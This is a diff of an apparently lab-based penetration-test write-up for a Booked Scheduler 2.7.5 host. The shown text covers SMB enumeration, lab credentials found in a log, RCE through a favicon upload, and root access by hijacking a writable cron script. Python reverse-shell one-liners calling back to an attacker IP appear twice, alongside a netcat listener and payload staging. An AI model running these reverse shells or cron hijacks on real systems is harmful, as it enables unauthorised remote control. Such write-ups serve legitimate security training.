@@ -179,12 +179,14 @@ Command
 ```
 smbmap -H 192.168.250.64
 ```
+
 ![](../Attachments/Pasted%20image%2020210924205523.png)
 
 Connection to SMB zino share
 ```
 smbclient //192.168.250.64/zino
 ```
+
 ![](../Attachments/Pasted%20image%2020210924205652.png)
 
 misc.log details
@@ -201,9 +203,11 @@ admin:adminadmin
 # Vulnerabilities
 
 Access to the admin page using the "admin:adminadmin" credentials found in misc.log file on the SMB server.
+
 ![](../Attachments/Pasted%20image%2020210924212307.png)
 
 Version exposed on the admin portal
+
 ![](../Attachments/Pasted%20image%2020210924213100.png)
 
 Looking over the Metasploit vulnerability for Booked Scheduler v2.7.5 there is a RCE vulnerability in the favicon upload.
@@ -218,13 +222,17 @@ Sent python reverse shell using webshell in Burp(Need to use a port already open
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.250",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
+
 ![](../Attachments/Pasted%20image%2020210924231236.png)
 
 Access to Machine with www-data user
+
 ![](../Attachments/Pasted%20image%2020210924231324.png)
 
 Database Password exposed
+
 ![](../Attachments/Pasted%20image%2020210924231536.png)
+
 ```
 booked_user:RoachSmallDudgeon368
 ```
@@ -233,6 +241,7 @@ booked_user:RoachSmallDudgeon368
 
 # Privilege Escalation
 Crontab scipt runs every 3 minutes with Read, Write access.
+
 ![](../Attachments/Pasted%20image%2020210924232659.png)
 
 Created a python reverse shell called cleanup.py.
@@ -244,6 +253,7 @@ import pty
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.250",21));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
 ```
+
 ![](../Attachments/Pasted%20image%2020210924235343.png)
 
 Removed old cleanup.py script
@@ -256,9 +266,11 @@ Set up python http server on port 8003(again to bypass the firewall rules).
 ```
 python3 -m http.server 8003
 ```
+
 ![](../Attachments/Pasted%20image%2020210924235241.png)
 
 Used wget to transfer python script to target.
+
 ![](../Attachments/Pasted%20image%2020210924235226.png)
 
 Set up listener on port 21 and waited for call back from cleanup.py
@@ -267,6 +279,7 @@ nc -nlvp 21
 ```
 
 Root shell gained
+
 ![](../Attachments/Pasted%20image%2020210924235500.png)
 
 ---
@@ -279,6 +292,7 @@ Command
 ```
 ifconfig;id;hostname;cat local.txt
 ```
+
 ![](../Attachments/Pasted%20image%2020210924235623.png)
 
 ## Root/Admin
@@ -288,4 +302,5 @@ Command
 ```
 ifconfig;id;hostname;cat proof.txt
 ```
+
 ![](../Attachments/Pasted%20image%2020210924235739.png)
